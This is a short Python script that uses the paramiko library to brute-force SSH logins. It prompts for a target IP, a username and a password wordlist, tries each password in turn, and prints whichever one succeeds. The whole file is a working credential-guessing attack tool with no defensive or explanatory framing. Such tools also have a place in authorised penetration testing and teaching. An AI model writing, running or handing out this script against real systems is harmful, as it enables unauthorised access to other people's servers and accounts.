import paramiko
import sys
import os

def get_input(prompt):
    return input(prompt).strip()

def ssh_connect(target, username, password, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target, port=port, username=username, password=password)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False
    finally:
        ssh.close()

def main():
    target = get_input('Please enter target IP address: ')
    username = get_input('Please enter username to brute-force: ')
    password_file = get_input('Please enter location of password file: ')
    
    #cross platform file handling
    password_file = os.path.abspath(password_file)

    if not os.path.isfile(password_file):
        print(f"Error: The file '{password_file}' does not exist.")
        sys.exit(1)

    print(f"Attempting to brute force SSH for {username}@{target}")
    
    try:
        with open(password_file, 'r') as file:
            for line in file:
                password = line.strip()
                print(f"Trying password: {password}")
                
                if ssh_connect(target, username, password):
                    print(f"Success! Password found: {password}")
                    return
        
        print("Password not found in the provided list.")
    except IOError as e:
        print(f"Error reading the password file: {e}")
    except KeyboardInterrupt:
        print("\nBrute force attempt was interrupted by the user.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()